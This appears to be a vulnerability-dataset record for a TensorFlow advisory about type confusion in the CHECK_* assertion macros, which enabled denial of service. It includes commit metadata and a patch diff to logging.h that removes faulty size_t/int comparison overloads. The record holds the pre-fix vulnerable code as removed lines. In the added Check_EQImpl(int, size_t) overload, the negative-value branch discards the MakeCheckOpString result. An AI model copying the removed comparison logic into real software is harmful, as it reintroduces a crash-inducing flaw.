            "summary":"Type confusion leading to `CHECK`-failure based denial of service in TensorFlow ### Impact\nThe [macros that TensorFlow uses for writing assertions (e.g., `CHECK_LT`, `CHECK_GT`, etc.)](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/platform\/default\/logging.h) have an incorrect logic when comparing `size_t` and `int` values. Due to type conversion rules, several of the macros would trigger incorrectly.\n\n### Patches\nWe have patched the issue in GitHub commit [b917181c29b50cb83399ba41f4d938dc369109a1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1) (merging GitHub PR [#55730](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/55730)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/55530).",
            "published_date":"2022-05-24",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b917181c29b50cb83399ba41f4d938dc369109a1",
            "commit_sha":"b917181c29b50cb83399ba41f4d938dc369109a1",
            "patch":"SINGLE",
            "chain_ord":"['b917181c29b50cb83399ba41f4d938dc369109a1']",
            "before_first_fix_commit":"{'cce6f6484e967a0be4df8702c8ac36d021542455', 'd73521b7603f10e3029a2f1cd5067ca985738fc8'}",
            "last_fix_commit":"b917181c29b50cb83399ba41f4d938dc369109a1",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/28\/2022, 21:41:18",
            "message":"Merge pull request #55730 from graphcore:awf\/issue-55530\n\nPiperOrigin-RevId: 445252025",
            "author":"TensorFlower Gardener",
            "comments":null,
            "stats":"{'additions': 73, 'deletions': 28, 'total': 101}",
            "files":"{'tensorflow\/core\/platform\/default\/logging.h': {'additions': 73, 'deletions': 28, 'changes': 101, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b917181c29b50cb83399ba41f4d938dc369109a1\/tensorflow%2Fcore%2Fplatform%2Fdefault%2Flogging.h', 'patch': '@@ -85,7 +85,7 @@ class LogMessage : public std::basic_ostringstream<char> {\\n \/\/ that the ternary VLOG() implementation is balanced, type wise.\\n struct Voidifier {\\n   template <typename T>\\n-  void operator&(const T&)const {}\\n+  void operator&(const T&) const {}\\n };\\n \\n \/\/ LogMessageFatal ensures the process will exit in failure after\\n@@ -348,11 +348,13 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\\n }\\n \\n \/\/ Helper functions for CHECK_OP macro.\\n-\/\/ The (int, int) specialization works around the issue that the compiler\\n+\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\\n+\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\\n+\/\/ This happens if, for example, those are used as token names in a\\n+\/\/ yacc grammar.\\n+\/\/ The (int, int) overload works around the issue that the compiler\\n \/\/ will not instantiate the template version of the function on values of\\n \/\/ unnamed enum type - see comment below.\\n-\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\\n-\/\/ comparison errors while still being thorough with the comparison.\\n #define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\\\\n   template <typename T1, typename T2>                                     \\\\\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\\\\n@@ -364,34 +366,77 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\\n   }                                                                       \\\\\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\\\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\\\\n-  }                                                                       \\\\\\n-  inline string* name##Impl(const size_t v1, const int v2,                \\\\\\n-                            const char* exprtext) {                       \\\\\\n-    if (TF_PREDICT_FALSE(v2 < 0)) {                                       \\\\\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\\\\n-    }                                                                     \\\\\\n-    return name##Impl<size_t, size_t>(v1, v2, exprtext);                  \\\\\\n-  }                                                                       \\\\\\n-  inline string* name##Impl(const int v1, const size_t v2,                \\\\\\n-                            const char* exprtext) {                       \\\\\\n-    if (TF_PREDICT_FALSE(v2 >= std::numeric_limits<int>::max())) {        \\\\\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\\\\n-    }                                                                     \\\\\\n-    const size_t uval = (size_t)((unsigned)v2);                           \\\\\\n-    return name##Impl<size_t, size_t>(v1, uval, exprtext);                \\\\\\n   }\\n \\n-\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\\n-\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\\n-\/\/ This happens if, for example, those are used as token names in a\\n-\/\/ yacc grammar.\\n-TF_DEFINE_CHECK_OP_IMPL(Check_EQ,\\n-                        ==)  \/\/ Compilation error with CHECK_EQ(NULL, x)?\\n-TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)  \/\/ Use CHECK(x == NULL) instead.\\n+\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\\n+\/\/ comparison errors while still being thorough with the comparison.\\n+\\n+TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\\n+\/\/ Compilation error with CHECK_EQ(NULL, x)?\\n+\/\/ Use CHECK(x == NULL) instead.\\n+\\n+inline string* Check_EQImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (TF_PREDICT_FALSE(v1 < 0))\\n+    ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+\\n+  return Check_EQImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_EQImpl(size_t v1, int v2, const char* exprtext) {\\n+  return Check_EQImpl(v2, v1, exprtext);\\n+}\\n+\\n+TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\\n+\\n+inline string* Check_NEImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 < 0) return NULL;\\n+\\n+  return Check_NEImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_NEImpl(size_t v1, int v2, const char* exprtext) {\\n+  return Check_NEImpl(v2, v1, exprtext);\\n+}\\n+\\n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\\n+\\n+inline string* Check_LEImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 <= 0) return NULL;\\n+\\n+  return Check_LEImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_LEImpl(size_t v1, int v2, const char* exprtext) {\\n+  if (TF_PREDICT_FALSE(v2 < 0))\\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+  return Check_LEImpl(v1, size_t(v2), exprtext);\\n+}\\n+\\n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\\n-TF_DEFINE_CHECK_OP_IMPL(Check_GE, >=)\\n-TF_DEFINE_CHECK_OP_IMPL(Check_GT, >)\\n+\\n+inline string* Check_LTImpl(int v1, size_t v2, const char* exprtext) {\\n+  if (v1 < 0) return NULL;\\n+\\n+  return Check_LTImpl(size_t(v1), v2, exprtext);\\n+}\\n+\\n+inline string* Check_LTImpl(size_t v1, int v2, const char* exprtext) {\\n+  if (v2 < 0)\\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\\n+  return Check_LTImpl(v1, size_t(v2), exprtext);\\n+}\\n+\\n+\/\/ Implement GE,GT in terms of LE,LT\\n+template <typename T1, typename T2>\\n+inline string* Check_GEImpl(const T1& v1, const T2& v2, const char* exprtext) {\\n+  return Check_LEImpl(v2, v1, exprtext);\\n+}\\n+\\n+template <typename T1, typename T2>\\n+inline string* Check_GTImpl(const T1& v1, const T2& v2, const char* exprtext) {\\n+  return Check_LTImpl(v2, v1, exprtext);\\n+}\\n+\\n #undef TF_DEFINE_CHECK_OP_IMPL\\n \\n \/\/ In optimized mode, use CheckOpString to hint to compiler that'}}",
            "message_norm":"merge pull request #55730 from graphcore:awf\/issue-55530\n\npiperorigin-revid: 445252025",
            "language":"en",
            "entities":"[('#55730', 'ISSUE', ''), ('445252025', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/platform\/default\/logging.h'])",
            "num_files":1.0,
            "patch_content":"From a3aada9b20f48f36f4484f8da3df290d3ee3a5da Mon Sep 17 00:00:00 2001\nFrom: Andrew Fitzgibbon <awf@graphcore.ai>\nDate: Mon, 25 Apr 2022 14:40:21 +0100\nSubject: [PATCH 1\/3] Fixe size_t vs int logic in CHECK_OP\n\n---\n tensorflow\/core\/platform\/default\/logging.h | 114 +++++++++++++++------\n 1 file changed, 85 insertions(+), 29 deletions(-)\n\ndiff --git a\/tensorflow\/core\/platform\/default\/logging.h b\/tensorflow\/core\/platform\/default\/logging.h\nindex 86e7da1d9669b2..95f55ca187399d 100644\n--- a\/tensorflow\/core\/platform\/default\/logging.h\n+++ b\/tensorflow\/core\/platform\/default\/logging.h\n@@ -348,12 +348,14 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n }\n \n \/\/ Helper functions for CHECK_OP macro.\n-\/\/ The (int, int) specialization works around the issue that the compiler\n+\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\n+\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\n+\/\/ This happens if, for example, those are used as token names in a\n+\/\/ yacc grammar.\n+\/\/ The (int, int) overload works around the issue that the compiler\n \/\/ will not instantiate the template version of the function on values of\n \/\/ unnamed enum type - see comment below.\n-\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n-\/\/ comparison errors while still being thorough with the comparison.\n-#define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\n+#define TF_DEFINE_CHECK_OP_IMPL(name, op)                            \\\n   template <typename T1, typename T2>                                     \\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\n                             const char* exprtext) {                       \\\n@@ -364,34 +366,88 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n   }                                                                       \\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\n-  }                                                                       \\\n-  inline string* name##Impl(const size_t v1, const int v2,                \\\n-                            const char* exprtext) {                       \\\n-    if (TF_PREDICT_FALSE(v2 < 0)) {                                       \\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\n-    }                                                                     \\\n-    return name##Impl<size_t, size_t>(v1, v2, exprtext);                  \\\n-  }                                                                       \\\n-  inline string* name##Impl(const int v1, const size_t v2,                \\\n-                            const char* exprtext) {                       \\\n-    if (TF_PREDICT_FALSE(v2 >= std::numeric_limits<int>::max())) {        \\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\n-    }                                                                     \\\n-    const size_t uval = (size_t)((unsigned)v2);                           \\\n-    return name##Impl<size_t, size_t>(v1, uval, exprtext);                \\\n-  }\n+  }                                                                       \n+\n+\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n+\/\/ comparison errors while still being thorough with the comparison.\n+\n+TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\n+\/\/ Compilation error with CHECK_EQ(NULL, x)?\n+\/\/ Use CHECK(x == NULL) instead.\n+\n+inline string* Check_EQImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (TF_PREDICT_FALSE(v1 < 0))\n+    ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+\n+  return Check_EQImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_EQImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  return Check_EQImpl(v2, v1, exprtext);\n+}\n+\n+TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\n+\n+inline string* Check_NEImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 < 0)\n+    return NULL; \n+    \n+  return Check_NEImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_NEImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  return Check_NEImpl(v2, v1, exprtext);\n+}\n \n-\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\n-\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\n-\/\/ This happens if, for example, those are used as token names in a\n-\/\/ yacc grammar.\n-TF_DEFINE_CHECK_OP_IMPL(Check_EQ,\n-                        ==)  \/\/ Compilation error with CHECK_EQ(NULL, x)?\n-TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)  \/\/ Use CHECK(x == NULL) instead.\n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\n+\n+inline string* Check_LEImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 <= 0)\n+    return NULL;\n+\n+  return Check_LEImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_LEImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  if (TF_PREDICT_FALSE(v2 < 0))\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+  return Check_LEImpl(v1, size_t(v2), exprtext);\n+}\n+\n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\n-TF_DEFINE_CHECK_OP_IMPL(Check_GE, >=)\n-TF_DEFINE_CHECK_OP_IMPL(Check_GT, >)\n+\n+inline string* Check_LTImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 < 0)\n+    return NULL;\n+\n+  return Check_LTImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_LTImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  if (v2 < 0)\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+  return Check_LTImpl(v1, size_t(v2), exprtext);\n+}\n+\n+\/\/ Implement GE,GT in terms of LE,LT\n+template <typename T1, typename T2>\n+inline string* Check_GEImpl(const T1& v1, const T2& v2, const char* exprtext) {\n+  return Check_LEImpl(v2, v1, exprtext);\n+}\n+\n+template <typename T1, typename T2>\n+inline string* Check_GTImpl(const T1& v1, const T2& v2, const char* exprtext) {\n+  return Check_LTImpl(v2, v1, exprtext);\n+}\n+\n #undef TF_DEFINE_CHECK_OP_IMPL\n \n \/\/ In optimized mode, use CheckOpString to hint to compiler that\n\nFrom f564d1feb7b56349e30028cd26690e651f7f0558 Mon Sep 17 00:00:00 2001\nFrom: Andrew Fitzgibbon <awf@graphcore.ai>\nDate: Mon, 25 Apr 2022 17:50:23 +0100\nSubject: [PATCH 2\/3] clang-format\n\n---\n tensorflow\/core\/platform\/default\/logging.h | 39 ++++++++--------------\n 1 file changed, 14 insertions(+), 25 deletions(-)\n\ndiff --git a\/tensorflow\/core\/platform\/default\/logging.h b\/tensorflow\/core\/platform\/default\/logging.h\nindex 95f55ca187399d..8666a8d4ace254 100644\n--- a\/tensorflow\/core\/platform\/default\/logging.h\n+++ b\/tensorflow\/core\/platform\/default\/logging.h\n@@ -355,7 +355,7 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n \/\/ The (int, int) overload works around the issue that the compiler\n \/\/ will not instantiate the template version of the function on values of\n \/\/ unnamed enum type - see comment below.\n-#define TF_DEFINE_CHECK_OP_IMPL(name, op)                            \\\n+#define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\n   template <typename T1, typename T2>                                     \\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\n                             const char* exprtext) {                       \\\n@@ -366,7 +366,7 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n   }                                                                       \\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\n-  }                                                                       \n+  }\n \n \/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n \/\/ comparison errors while still being thorough with the comparison.\n@@ -375,46 +375,38 @@ TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\n \/\/ Compilation error with CHECK_EQ(NULL, x)?\n \/\/ Use CHECK(x == NULL) instead.\n \n-inline string* Check_EQImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n+inline string* Check_EQImpl(int v1, size_t v2, const char* exprtext) {\n   if (TF_PREDICT_FALSE(v1 < 0))\n     ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n \n   return Check_EQImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_EQImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_EQImpl(size_t v1, int v2, const char* exprtext) {\n   return Check_EQImpl(v2, v1, exprtext);\n }\n \n TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\n \n-inline string* Check_NEImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 < 0)\n-    return NULL; \n-    \n+inline string* Check_NEImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 < 0) return NULL;\n+\n   return Check_NEImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_NEImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_NEImpl(size_t v1, int v2, const char* exprtext) {\n   return Check_NEImpl(v2, v1, exprtext);\n }\n \n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\n \n-inline string* Check_LEImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 <= 0)\n-    return NULL;\n+inline string* Check_LEImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 <= 0) return NULL;\n \n   return Check_LEImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_LEImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_LEImpl(size_t v1, int v2, const char* exprtext) {\n   if (TF_PREDICT_FALSE(v2 < 0))\n     return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n   return Check_LEImpl(v1, size_t(v2), exprtext);\n@@ -422,16 +414,13 @@ inline string* Check_LEImpl(size_t v1, int v2,\n \n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\n \n-inline string* Check_LTImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 < 0)\n-    return NULL;\n+inline string* Check_LTImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 < 0) return NULL;\n \n   return Check_LTImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_LTImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_LTImpl(size_t v1, int v2, const char* exprtext) {\n   if (v2 < 0)\n     return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n   return Check_LTImpl(v1, size_t(v2), exprtext);\n\nFrom d73521b7603f10e3029a2f1cd5067ca985738fc8 Mon Sep 17 00:00:00 2001\nFrom: Andrew Fitzgibbon <awf@graphcore.ai>\nDate: Tue, 26 Apr 2022 08:30:22 +0100\nSubject: [PATCH 3\/3] Clang format version mismatch\n\n---\n tensorflow\/core\/platform\/default\/logging.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/tensorflow\/core\/platform\/default\/logging.h b\/tensorflow\/core\/platform\/default\/logging.h\nindex 8666a8d4ace254..dfee3a62c47028 100644\n--- a\/tensorflow\/core\/platform\/default\/logging.h\n+++ b\/tensorflow\/core\/platform\/default\/logging.h\n@@ -85,7 +85,7 @@ class LogMessage : public std::basic_ostringstream<char> {\n \/\/ that the ternary VLOG() implementation is balanced, type wise.\n struct Voidifier {\n   template <typename T>\n-  void operator&(const T&)const {}\n+  void operator&(const T&) const {}\n };\n \n \/\/ LogMessageFatal ensures the process will exit in failure after",
            "code_diff":"@@ -348,12 +348,14 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n }\n \n \/\/ Helper functions for CHECK_OP macro.\n-\/\/ The (int, int) specialization works around the issue that the compiler\n+\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\n+\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\n+\/\/ This happens if, for example, those are used as token names in a\n+\/\/ yacc grammar.\n+\/\/ The (int, int) overload works around the issue that the compiler\n \/\/ will not instantiate the template version of the function on values of\n \/\/ unnamed enum type - see comment below.\n-\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n-\/\/ comparison errors while still being thorough with the comparison.\n-#define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\n+#define TF_DEFINE_CHECK_OP_IMPL(name, op)                            \\\n   template <typename T1, typename T2>                                     \\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\n                             const char* exprtext) {                       \\\n@@ -364,34 +366,88 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n   }                                                                       \\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\n-  }                                                                       \\\n-  inline string* name##Impl(const size_t v1, const int v2,                \\\n-                            const char* exprtext) {                       \\\n-    if (TF_PREDICT_FALSE(v2 < 0)) {                                       \\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\n-    }                                                                     \\\n-    return name##Impl<size_t, size_t>(v1, v2, exprtext);                  \\\n-  }                                                                       \\\n-  inline string* name##Impl(const int v1, const size_t v2,                \\\n-                            const char* exprtext) {                       \\\n-    if (TF_PREDICT_FALSE(v2 >= std::numeric_limits<int>::max())) {        \\\n-      return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext); \\\n-    }                                                                     \\\n-    const size_t uval = (size_t)((unsigned)v2);                           \\\n-    return name##Impl<size_t, size_t>(v1, uval, exprtext);                \\\n-  }\n+  }                                                                       \n+\n+\/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n+\/\/ comparison errors while still being thorough with the comparison.\n+\n+TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\n+\/\/ Compilation error with CHECK_EQ(NULL, x)?\n+\/\/ Use CHECK(x == NULL) instead.\n+\n+inline string* Check_EQImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (TF_PREDICT_FALSE(v1 < 0))\n+    ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+\n+  return Check_EQImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_EQImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  return Check_EQImpl(v2, v1, exprtext);\n+}\n+\n+TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\n+\n+inline string* Check_NEImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 < 0)\n+    return NULL; \n+    \n+  return Check_NEImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_NEImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  return Check_NEImpl(v2, v1, exprtext);\n+}\n \n-\/\/ We use the full name Check_EQ, Check_NE, etc. in case the file including\n-\/\/ base\/logging.h provides its own #defines for the simpler names EQ, NE, etc.\n-\/\/ This happens if, for example, those are used as token names in a\n-\/\/ yacc grammar.\n-TF_DEFINE_CHECK_OP_IMPL(Check_EQ,\n-                        ==)  \/\/ Compilation error with CHECK_EQ(NULL, x)?\n-TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)  \/\/ Use CHECK(x == NULL) instead.\n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\n+\n+inline string* Check_LEImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 <= 0)\n+    return NULL;\n+\n+  return Check_LEImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_LEImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  if (TF_PREDICT_FALSE(v2 < 0))\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+  return Check_LEImpl(v1, size_t(v2), exprtext);\n+}\n+\n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\n-TF_DEFINE_CHECK_OP_IMPL(Check_GE, >=)\n-TF_DEFINE_CHECK_OP_IMPL(Check_GT, >)\n+\n+inline string* Check_LTImpl(int v1, size_t v2,\n+                            const char* exprtext) {\n+  if (v1 < 0)\n+    return NULL;\n+\n+  return Check_LTImpl(size_t(v1), v2, exprtext);\n+}\n+\n+inline string* Check_LTImpl(size_t v1, int v2,\n+                            const char* exprtext) {\n+  if (v2 < 0)\n+    return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n+  return Check_LTImpl(v1, size_t(v2), exprtext);\n+}\n+\n+\/\/ Implement GE,GT in terms of LE,LT\n+template <typename T1, typename T2>\n+inline string* Check_GEImpl(const T1& v1, const T2& v2, const char* exprtext) {\n+  return Check_LEImpl(v2, v1, exprtext);\n+}\n+\n+template <typename T1, typename T2>\n+inline string* Check_GTImpl(const T1& v1, const T2& v2, const char* exprtext) {\n+  return Check_LTImpl(v2, v1, exprtext);\n+}\n+\n #undef TF_DEFINE_CHECK_OP_IMPL\n \n \/\/ In optimized mode, use CheckOpString to hint to compiler that\n\nFrom: Andrew Fitzgibbon <awf@graphcore.ai>\n\n tensorflow\/core\/platform\/default\/logging.h | 39 ++++++++--------------\n 1 file changed, 14 insertions(+), 25 deletions(-)\n\n@@ -355,7 +355,7 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n \/\/ The (int, int) overload works around the issue that the compiler\n \/\/ will not instantiate the template version of the function on values of\n \/\/ unnamed enum type - see comment below.\n-#define TF_DEFINE_CHECK_OP_IMPL(name, op)                            \\\n+#define TF_DEFINE_CHECK_OP_IMPL(name, op)                                 \\\n   template <typename T1, typename T2>                                     \\\n   inline string* name##Impl(const T1& v1, const T2& v2,                   \\\n                             const char* exprtext) {                       \\\n@@ -366,7 +366,7 @@ string* MakeCheckOpString(const T1& v1, const T2& v2, const char* exprtext) {\n   }                                                                       \\\n   inline string* name##Impl(int v1, int v2, const char* exprtext) {       \\\n     return name##Impl<int, int>(v1, v2, exprtext);                        \\\n-  }                                                                       \n+  }\n \n \/\/ The (size_t, int) and (int, size_t) specialization are to handle unsigned\n \/\/ comparison errors while still being thorough with the comparison.\n@@ -375,46 +375,38 @@ TF_DEFINE_CHECK_OP_IMPL(Check_EQ, ==)\n \/\/ Compilation error with CHECK_EQ(NULL, x)?\n \/\/ Use CHECK(x == NULL) instead.\n \n-inline string* Check_EQImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n+inline string* Check_EQImpl(int v1, size_t v2, const char* exprtext) {\n   if (TF_PREDICT_FALSE(v1 < 0))\n     ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n \n   return Check_EQImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_EQImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_EQImpl(size_t v1, int v2, const char* exprtext) {\n   return Check_EQImpl(v2, v1, exprtext);\n }\n \n TF_DEFINE_CHECK_OP_IMPL(Check_NE, !=)\n \n-inline string* Check_NEImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 < 0)\n-    return NULL; \n-    \n+inline string* Check_NEImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 < 0) return NULL;\n+\n   return Check_NEImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_NEImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_NEImpl(size_t v1, int v2, const char* exprtext) {\n   return Check_NEImpl(v2, v1, exprtext);\n }\n \n TF_DEFINE_CHECK_OP_IMPL(Check_LE, <=)\n \n-inline string* Check_LEImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 <= 0)\n-    return NULL;\n+inline string* Check_LEImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 <= 0) return NULL;\n \n   return Check_LEImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_LEImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_LEImpl(size_t v1, int v2, const char* exprtext) {\n   if (TF_PREDICT_FALSE(v2 < 0))\n     return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n   return Check_LEImpl(v1, size_t(v2), exprtext);\n@@ -422,16 +414,13 @@ inline string* Check_LEImpl(size_t v1, int v2,\n \n TF_DEFINE_CHECK_OP_IMPL(Check_LT, <)\n \n-inline string* Check_LTImpl(int v1, size_t v2,\n-                            const char* exprtext) {\n-  if (v1 < 0)\n-    return NULL;\n+inline string* Check_LTImpl(int v1, size_t v2, const char* exprtext) {\n+  if (v1 < 0) return NULL;\n \n   return Check_LTImpl(size_t(v1), v2, exprtext);\n }\n \n-inline string* Check_LTImpl(size_t v1, int v2,\n-                            const char* exprtext) {\n+inline string* Check_LTImpl(size_t v1, int v2, const char* exprtext) {\n   if (v2 < 0)\n     return ::tensorflow::internal::MakeCheckOpString(v1, v2, exprtext);\n   return Check_LTImpl(v1, size_t(v2), exprtext);\n\nFrom: Andrew Fitzgibbon <awf@graphcore.ai>\n\n tensorflow\/core\/platform\/default\/logging.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n@@ -85,7 +85,7 @@ class LogMessage : public std::basic_ostringstream<char> {\n \/\/ that the ternary VLOG() implementation is balanced, type wise.\n struct Voidifier {\n   template <typename T>\n-  void operator&(const T&)const {}\n+  void operator&(const T&) const {}\n };\n \n \/\/ LogMessageFatal ensures the process will exit in failure after"
